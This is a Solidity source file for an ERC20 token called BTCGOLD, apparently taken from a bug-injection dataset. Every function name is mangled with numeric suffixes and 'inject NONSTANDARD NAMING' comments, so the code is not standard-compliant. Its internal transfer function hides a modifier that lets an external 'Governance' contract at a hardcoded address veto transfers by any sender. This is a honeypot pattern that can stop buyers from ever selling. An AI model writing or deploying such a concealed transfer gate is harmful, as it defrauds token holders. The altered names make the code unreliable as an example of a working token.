                                                                 

pragma solidity ^ 0.5.16;

interface IERC20 {
    function TOTALSUPPLY734() external view returns(uint);	//inject NONSTANDARD NAMING

    function BALANCEOF241(address account) external view returns(uint);	//inject NONSTANDARD NAMING

    function TRANSFER999(address recipient, uint amount) external returns(bool);	//inject NONSTANDARD NAMING

    function ALLOWANCE177(address owner, address spender) external view returns(uint);	//inject NONSTANDARD NAMING

    function APPROVE651(address spender, uint amount) external returns(bool);	//inject NONSTANDARD NAMING

    function TRANSFERFROM26(address sender, address recipient, uint amount) external returns(bool);	//inject NONSTANDARD NAMING
    event TRANSFER539(address indexed from, address indexed to, uint value);	//inject NONSTANDARD NAMING
    event APPROVAL240(address indexed owner, address indexed spender, uint value);	//inject NONSTANDARD NAMING
}

interface Governance {
    function ISPARTNER207(address) external returns(bool);	//inject NONSTANDARD NAMING
}

contract Context {
    constructor() internal {}
        // solhint-disable-previous-line no-empty-blocks

    function _MSGSENDER1() internal view returns(address payable) {	//inject NONSTANDARD NAMING
        return msg.sender;
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    address _governance = 0xc99AFed4b14AD5295396f8EEeB45280dFB725134;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function TOTALSUPPLY734() public view returns(uint) {	//inject NONSTANDARD NAMING
        return _totalSupply;
    }

    function BALANCEOF241(address account) public view returns(uint) {	//inject NONSTANDARD NAMING
        return _balances[account];
    }

    function TRANSFER999(address recipient, uint amount) public returns(bool) {	//inject NONSTANDARD NAMING
        _TRANSFER566(_MSGSENDER1(), recipient, amount);
        return true;
    }

    function ALLOWANCE177(address owner, address spender) public view returns(uint) {	//inject NONSTANDARD NAMING
        return _allowances[owner][spender];
    }

    function APPROVE651(address spender, uint amount) public returns(bool) {	//inject NONSTANDARD NAMING
        _APPROVE309(_MSGSENDER1(), spender, amount);
        return true;
    }

    function TRANSFERFROM26(address sender, address recipient, uint amount) public returns(bool) {	//inject NONSTANDARD NAMING
        _TRANSFER566(sender, recipient, amount);
        _APPROVE309(sender, _MSGSENDER1(), _allowances[sender][_MSGSENDER1()].SUB316(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function INCREASEALLOWANCE652(address spender, uint addedValue) public returns(bool) {	//inject NONSTANDARD NAMING
        _APPROVE309(_MSGSENDER1(), spender, _allowances[_MSGSENDER1()][spender].ADD212(addedValue));
        return true;
    }

    function DECREASEALLOWANCE164(address spender, uint subtractedValue) public returns(bool) {	//inject NONSTANDARD NAMING
        _APPROVE309(_MSGSENDER1(), spender, _allowances[_MSGSENDER1()][spender].SUB316(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _TRANSFER566(address sender, address recipient, uint amount) internal ENSURE925(sender) {	//inject NONSTANDARD NAMING
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].SUB316(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].ADD212(amount);
        emit TRANSFER539(sender, recipient, amount);
    }

    function _MINT707(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.ADD212(amount);
        _balances[account] = _balances[account].ADD212(amount);
        emit TRANSFER539(address(0), account, amount);
    }

    function _BURN518(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].SUB316(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.SUB316(amount);
        emit TRANSFER539(account, address(0), amount);
    }

    modifier ENSURE925(address sender) {	//inject NONSTANDARD NAMING
        require(Governance(_governance).ISPARTNER207(sender));
        _;
    }

    function _APPROVE309(address owner, address spender, uint amount) internal {	//inject NONSTANDARD NAMING
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit APPROVAL240(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function NAME597() public view returns(string memory) {	//inject NONSTANDARD NAMING
        return _name;
    }

    function SYMBOL27() public view returns(string memory) {	//inject NONSTANDARD NAMING
        return _symbol;
    }

    function DECIMALS204() public view returns(uint8) {	//inject NONSTANDARD NAMING
        return _decimals;
    }
}

library SafeMath {
    function ADD212(uint a, uint b) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function SUB316(uint a, uint b) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        return SUB316(a, b, "SafeMath: subtraction overflow");
    }

    function SUB316(uint a, uint b, string memory errorMessage) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function MUL123(uint a, uint b) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function DIV304(uint a, uint b) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        return DIV304(a, b, "SafeMath: division by zero");
    }

    function DIV304(uint a, uint b, string memory errorMessage) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library Address {
    function ISCONTRACT810(address account) internal view returns(bool) {	//inject NONSTANDARD NAMING
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

library SafeERC20 {
    using SafeMath
    for uint;
    using Address
    for address;

    function SAFETRANSFER762(IERC20 token, address to, uint value) internal {	//inject NONSTANDARD NAMING
        CALLOPTIONALRETURN536(token, abi.encodeWithSelector(token.TRANSFER999.selector, to, value));
    }

    function SAFETRANSFERFROM775(IERC20 token, address from, address to, uint value) internal {	//inject NONSTANDARD NAMING
        CALLOPTIONALRETURN536(token, abi.encodeWithSelector(token.TRANSFERFROM26.selector, from, to, value));
    }

    function SAFEAPPROVE310(IERC20 token, address spender, uint value) internal {	//inject NONSTANDARD NAMING
        require((value == 0) || (token.ALLOWANCE177(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        CALLOPTIONALRETURN536(token, abi.encodeWithSelector(token.APPROVE651.selector, spender, value));
    }

    function CALLOPTIONALRETURN536(IERC20 token, bytes memory data) private {	//inject NONSTANDARD NAMING
        require(address(token).ISCONTRACT810(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract BTCGOLD is ERC20, ERC20Detailed {

    mapping(address => bool) public minters;
    constructor() public ERC20Detailed("BTCGOLD","BTCGOLD",18) {
        _MINT707(msg.sender, 10000 * 10 ** 18);
    }




}